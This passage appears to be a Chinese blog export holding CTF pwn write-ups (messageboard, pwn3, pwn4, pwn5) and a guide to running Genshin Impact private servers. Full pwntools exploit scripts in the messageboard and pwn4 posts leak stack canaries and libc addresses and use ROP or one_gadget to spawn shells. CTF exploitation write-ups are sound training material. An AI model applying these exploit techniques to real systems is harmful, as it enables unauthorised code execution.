    <content><![CDATA[<h3 id="messageboard"><a href="#messageboard" class="headerlink" title="messageboard"></a>messageboard</h3><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
<li>Canary绕过原理</li>
<li>PIE绕过原理</li>
<li>对gdb调试器的使用</li>
</ul>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><ul>
<li>使用<code>checksec</code>进行检查：<br><img src="/img/posts/2023-10-23-messageboard/images/checksec.png" alt="checksec"></li>
</ul>
<p><img src="/img/posts/2023-10-23-messageboard/images/file.png" alt="file"></p>
<p>​		可知程序为64位，有DEP、ASLR、Canary、PIE等保护。<code>Canary</code>是一种栈溢出保护手段，会在栈中压入随机值，如果进行栈溢出攻击，会导致随机值改变，导致验证失败，从而程序不会执行。<code>PIE(position-independent executable, 地址无关可执行文件)</code>技术就是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。</p>
<ul>
<li>使用<code>ldd</code>命令查看程序的依赖库libc和ld：</li>
</ul>
<p><img src="/img/posts/2023-10-23-messageboard/images/ldd.png" alt="ldd"></p>
<p>​		使用<code>patchelf</code>进行修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.31.so ./message_board</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Documents/tools/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/ld-2.31.so ./message_board</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2023-10-23-messageboard/images/ldd-1.png" alt="ldd-1"></p>
<ul>
<li>构造python脚本，进行调试，查看程序vmmap以及stack的情况：</li>
</ul>
<p><code>vmmap</code>：后3位均为0，前几位每次调试都会发生变化</p>
<p><img src="/img/posts/2023-10-23-messageboard/images/vmmap.png" alt="vmmap"></p>
<p><img src="/img/posts/2023-10-23-messageboard/images/vmmap-1.png" alt="vmmap-1"></p>
<p><code>stack</code>：其中有随机值<code>&quot;0x7e9818f231b8c000&quot;</code>和<code>&quot;0xf0297d8f04ed1000&quot;</code></p>
<p><img src="/img/posts/2023-10-23-messageboard/images/stack.png" alt="stack"></p>
<p><img src="/img/posts/2023-10-23-messageboard/images/stack-1.png" alt="stack-1"></p>
<ul>
<li>使用ida工具打开程序，逆向分析，在<code>sub_11C9</code>函数位置有<code>getchar</code>函数，只有输入回车符时才会结束输入，存在栈溢出漏洞：</li>
</ul>
<p><img src="/img/posts/2023-10-23-messageboard/images/sub_11C9.png" alt="sub_11C9"></p>
<ul>
<li>由于<code>sub_11FF</code>函数中的<code>printf</code>函数<code>%s</code>参数仅在字符串结尾为<code>\x00</code>字符时才会停止输出，因此可以尝试在此处泄漏<code>canary</code>和<code>libc</code>的地址。</li>
</ul>
<p><img src="/img/posts/2023-10-23-messageboard/images/sub_11FF.png" alt="sub_11FF"></p>
<ul>
<li>构造脚本，主要思路（五次栈溢出）：首先通过printf函数的输出特性泄漏<code>Canary</code>值，然后在第二次调用<code>sub_11C9</code>函数时，通过覆盖部分地址使程序本应执行到<code>0x1310</code>转而执行<code>0x130b</code>（通过覆盖最后一字节实现），如下图所示：</li>
</ul>
<p>![partial write](&#x2F;img&#x2F;posts&#x2F;2023-10-23-messageboard&#x2F;images&#x2F;partial write.png)</p>
<p>​		然后程序重新进入漏洞函数，通过栈溢出覆盖截断字符<code>\x00</code>使<code>printf</code>函数输出程序基址。如下图所示，通过计算偏移可以得到程序基址：</p>
<p><img src="/img/posts/2023-10-23-messageboard/images/%E7%A8%8B%E5%BA%8F%E5%9F%BA%E5%9D%80.png" alt="程序基址"></p>
<p>​		然后继续到第二个<code>sub_11c9</code>函数，根据<code>got</code>表获取到libc基址，最后根据libc基址以及<code>one_gadget</code>工具可以得到结果shell：</p>
<p><code>python脚本如下</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./message_board&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取canary</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>+<span class="number">1</span>))</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x11FD)&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What &#x27;s your name?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">puts_canary_libc = p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(puts_canary_libc.rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parital Write， 重新跳转到漏洞函数</span></span><br><span class="line">main_addr_offset = <span class="string">b&#x27;\x0B&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), p64(canary), p64(<span class="number">0</span>), main_addr_offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序基址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What &#x27;s your name?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">mov_eax_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = mov_eax_addr - <span class="number">0x1310</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取libc基址</span></span><br><span class="line">pop_rdi = base_addr + <span class="number">0x1383</span></span><br><span class="line">retn = base_addr + <span class="number">0x12A8</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./message_board&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] + base_addr</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] + base_addr</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libc_puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 0x84420</span></span><br><span class="line">libc_system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 0x52290</span></span><br><span class="line">sub_11ff_addr = base_addr + <span class="number">0x130B</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), p64(canary), p64(<span class="number">0</span>), p64(retn), p64(pop_rdi), p64(puts_got), p64(puts_plt), p64(sub_11ff_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say?\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Thanks!\n&quot;</span>)</span><br><span class="line">puts_libc = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_libc = u64(puts_libc.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_libc - libc_puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># # one_gadget</span></span><br><span class="line"><span class="comment"># one_gadget = libc_base + 0xe3b01</span></span><br><span class="line"><span class="comment"># payload = flat(b&#x27;e&#x27;*(0x20+8), p64(canary), p64(0x0), p64(one_gadget))</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x11FD)&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(b&quot;What &#x27;s your name?\n&quot;, payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system函数</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + libc_system_offset</span><br><span class="line">payload = flat(<span class="string">b&#x27;f&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), p64(canary), p64(<span class="number">0</span>), p64(retn), p64(pop_rdi), p64(bin_sh_addr), p64(system_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What &#x27;s your name?\n&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say?\n&#x27;</span>, <span class="string">b&#x27;FFF&#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(b&quot;Thanks!\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>注：需要注意在进行代码的注入时，需要考虑栈帧对齐的问题，eg: <code>payload = flat(b&#39;f&#39;*(0x20+8), p64(canary), p64(0), p64(pop_rdi), p64(bin_sh_addr)</code>中<code>p64(0)</code>为赋给<code>rbp</code>寄存器的值，<code>p64(retn)</code>为将<code>pop rdi</code>进行栈对齐所需添加的占位值。</p>
<ul>
<li>构造脚本，主要思路（四次栈溢出）：前两次栈溢出与前一种情况相同；</li>
</ul>
<p>​		然后程序会再次执行漏洞函数，通过栈溢出覆盖截断字符<code>\x00</code>使得<code>printf</code>函数输出libc的基址。如下图所示，通过计算偏移可以得到libc的基址</p>
<p><img src="/img/posts/2023-10-23-messageboard/images/libc_base.png" alt="libc_base"></p>
<p>​		然后继续到第二个<code>sub_11c9</code>函数，根据libc基址以及<code>one_gadget</code>工具可以得到结果shell：</p>
<p><code>python脚本如下</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./message_board&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取canary</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>+<span class="number">1</span>))</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x11FD)&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What &#x27;s your name?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">puts_canary_libc = p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(puts_canary_libc.rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parital Write， 重新跳转到漏洞函数</span></span><br><span class="line">main_addr_offset = <span class="string">b&#x27;\x0B&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), p64(canary), p64(<span class="number">0</span>), main_addr_offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取libc基址</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">16</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What &#x27;s your name?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">mov_edi_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(mov_edi_addr)</span><br><span class="line">mov_edi_addr = u64(mov_edi_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(mov_edi_addr))</span><br><span class="line">libc_base = mov_edi_addr - <span class="number">0x24083</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;e&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>), p64(canary), p64(<span class="number">0x0</span>), p64(one_gadget))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What do you want to say?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/img/posts/2023-10-23-messageboard/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN3</title>
    <url>/posts/5290eb16.html</url>
    <content><![CDATA[<h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
<li>堆栈溢出原理</li>
<li>ROP攻击</li>
<li>Ida、pwndbg工具的使用</li>
<li>熟悉汇编语言</li>
</ul>
<hr>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先使用<code>checksec</code>工具检查<code>pwn3</code>文件基本信息，基本信息如下：</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/checksec.png" alt="checksec"></p>
<p>然后<code>./pwn3</code>运行一下，查看效果（注：权限可能需要修改以保证可以正常执行）</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C.png" alt="正常运行"></p>
<p>尝试输入较长字符串，查看结果，说明存在栈溢出漏洞。</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/%E5%AD%98%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.png" alt="栈溢出漏洞"></p>
<p>使用ida工具逆向分析：</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/main%E5%87%BD%E6%95%B0%E5%8F%8D%E6%B1%87%E7%BC%96.png" alt="main函数反汇编"></p>
<p>ROP攻击思路，将栈溢出到old_ebp下，后面覆盖要执行的<code>system(&quot;bin/sh&quot;)</code>代码：</p>
<img src="/img/posts/2023-10-23-pwn3/images/ROP攻击原理.png" />

<p>经过静态分析，得到<code>system</code>函数地址：</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/system%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="system函数地址"></p>
<p><code>&quot;/bin/sh&quot;</code>地址：</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%B0%E5%9D%80.png" alt="字符串地址"></p>
<p>对pwn3进行动态调试，查看要填充多少字节才可以发生堆栈溢出：</p>
<p>在<code>stack_overflow</code>函数地址<code>0x800484F3</code>下断点:</p>
<p><img src="/img/posts/2023-10-23-pwn3/images/stackoverflow%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="stackoverflow函数地址"></p>
<p>查看<code>stack_overflow</code>内部<code>read</code>函数前设置了<code>0x28</code>字节的参数，因此需要输入28位以上才可以产生栈溢出覆盖返回地址。<img src="/img/posts/2023-10-23-pwn3/images/gdb.png" alt="image-20230921224714276"></p>
<p>构造<code>EXP.py</code>攻击<code>pwn3</code></p>
<p><img src="/img/posts/2023-10-23-pwn3/images/python%E6%96%87%E4%BB%B6.png" alt="python文件"></p>
<p>通过向<code>pwn3</code>发送超过<code>0x28+4</code>字节的输入，可以覆盖到返回地址，从而影响函数执行，使<code>pwn3</code>转去执行其他的函数</p>
<hr>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/img/posts/2023-10-23-pwn3/images/%E7%BB%93%E6%9E%9C.png" alt="结果"></p>
<p>成功弹出shell。</p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>某二次元游戏私服搭建总结</title>
    <url>/posts/af718253.html</url>
    <content><![CDATA[<h1 id="某二次元游戏私服搭建总结"><a href="#某二次元游戏私服搭建总结" class="headerlink" title="某二次元游戏私服搭建总结"></a>某二次元游戏私服搭建总结</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn4 writeup</title>
    <url>/posts/9e08527c.html</url>
    <content><![CDATA[<h3 id="题目：pwn4"><a href="#题目：pwn4" class="headerlink" title="题目：pwn4"></a>题目：pwn4</h3><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><ul>
<li>64位ROP攻击</li>
<li>栈溢出攻击</li>
</ul>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><ul>
<li><p>首先使用<code>checksec</code>工具查看<code>pwn4</code>状态<img src="/img/posts/2023-10-23-pwn4/images/checksec.png" alt="checksec"></p>
</li>
<li><p>由图可知<code>pwn4</code>为64位程序，且开启了DEP机制，因此可以使用ROP攻击，只不过由于64位程序函数前6个参数会存储在寄存器rdi，rsi，rdx，rcx，r8，r9中，因此需要使用<code>ROPgadget</code>工具寻找可用片段将参数传入寄存器rdi中。</p>
</li>
<li><p>使用<code>ida64</code>工具打开，获取到重要地址<code>stack_flow</code>, <code>system</code>, <code>&quot;/bin/sh&quot;</code>的地址，使用<code>ROPgadget</code>工具获取到<code>pop rdi, ret</code>片段的地址：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>函数或字符串</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>stack_flow</td>
<td>0x040061B</td>
</tr>
<tr>
<td>system</td>
<td>0x0400480</td>
</tr>
<tr>
<td>“&#x2F;bin&#x2F;sh”</td>
<td>0x04006FF</td>
</tr>
<tr>
<td>pop rdi, ret</td>
<td>0x0400693</td>
</tr>
</tbody></table>
<ul>
<li><p>使用<code>pwndbg</code>来动态调试，在<code>stack_flow</code>函数下断点，可见传入<code>read</code>函数的参数为<code>0x20</code>个字节，要覆盖到寄存器<code>rbp</code>，需要<code>0x20+8</code>个输入；</p>
</li>
<li><p>构造python脚本，需要构造payload向pwn4传入(0x20+8)字符覆盖到函数返回地址，然后加入system函数地址，并传入参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_flow = <span class="number">0x40061B</span></span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line">bin_sh = <span class="number">0x4006FF</span></span><br><span class="line">pop_rdi = <span class="number">0x400693</span></span><br><span class="line">ret = <span class="number">0x4005F3</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;04005F2&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me your payload&quot;</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), ret, pop_rdi, bin_sh, system)</span><br><span class="line">gdb.attach(p, <span class="string">f&#x27;b *0x<span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>注：如果不加<code>ret</code>，<code>pop rdi</code>栈地址为<code>0x47e4b8</code>末尾不为0，因此无法正确执行，所以需要加入ret，使后面命令对齐。</p>
</li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn4/images/stack-1.png" alt="stack-1"></p>
<p>​		加入<code>ret</code>后栈的情况。</p>
<p><img src="/img/posts/2023-10-23-pwn4/images/stack.png" alt="stack"></p>
<ul>
<li>结果成功利用栈溢出获取到shell：</li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn4/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN5 WriteUp</title>
    <url>/posts/2ba0cfe.html</url>
    <content><![CDATA[<h3 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
<li>对<code>ldd, patchelf</code>命令以及依赖库版本的了解</li>
<li>对ASLR机制的理解</li>
<li><code>one_gadget</code>工具使用</li>
</ul>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
<li>首先使用<code>checksec, files</code>查看程序基本信息：</li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn5/images/checksec.png" alt="checksec"></p>
<p><img src="/img/posts/2023-10-23-pwn5/images/file.png" alt="file"></p>
<p>​		可见程序为64位，开启DEP保护，为动态链接的程序。</p>
<ul>
<li>使用<code>ldd</code>命令检查程序运行所需的依赖库，其中包括程序所依赖的C函数库<code>libc.so.6</code>以及动态链接器 <code>ld-linux-x86-64.so.2</code> 的路径</li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn5/images/ldd.png" alt="ldd"></p>
<ul>
<li>使用 <code>patchelf </code>替换 <code>libc</code> 与 <code>ld</code> 到指定版本，该步骤目的是将本地运行环境调整到与预期一致。 <code>libc</code> 与 <code>ld</code> 的版本必须匹配，题中给定了 <code>libc-2.23.so</code> ，因此需要2.23版本的 <code>ld</code> 。</li>
</ul>
<p> <img src="/img/posts/2023-10-23-pwn5/images/ldd-1.png" alt="ldd-1"></p>
<ul>
<li>使用<code>ida</code>打开，反编译：</li>
</ul>
<p><code>main</code>: </p>
<p><img src="/img/posts/2023-10-23-pwn5/images/main.png" alt="main"></p>
<p><code>stack_flow</code>: <code>read</code>函数存在漏洞</p>
<p><img src="/img/posts/2023-10-23-pwn5/images/stack_flow.png" alt="stack_flow"></p>
<ul>
<li>使用<code>ROPgadget</code>工具查找程序中是否有<code>system</code>函数和<code>&quot;/bin/sh&quot;</code>字符串，结果表明并没有，因此需要自行输入字符串，并从动态链接库中查找<code>system</code>函数的偏移</li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn5/images/system&bin_sh.png" alt="system&amp;bin_sh"></p>
<ul>
<li><p>构造脚本获取到<code>puts</code>函数在<code>libc</code>中的相对偏移：</p>
